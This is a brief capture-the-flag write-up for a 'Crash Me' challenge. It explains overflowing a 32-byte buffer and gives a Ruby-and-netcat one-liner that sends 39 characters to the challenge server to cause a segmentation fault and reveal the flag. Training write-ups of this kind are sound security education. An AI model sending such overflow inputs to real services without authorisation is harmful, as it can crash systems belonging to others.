# [Crash Me](https://training.majorleaguecyber.org/challenges#crashme)

This is a simple buffer overflow where all we need is to cause a Segmentation Fault.

We can see in the source code that `buffer` is given 32 bytes but we can input more than 
that which will cause an overflow. Turns out 39 characters is enough:

`ruby -e "puts 'A'*39"|nc challenges.hackerfire.com 30002`

And there's our flag!
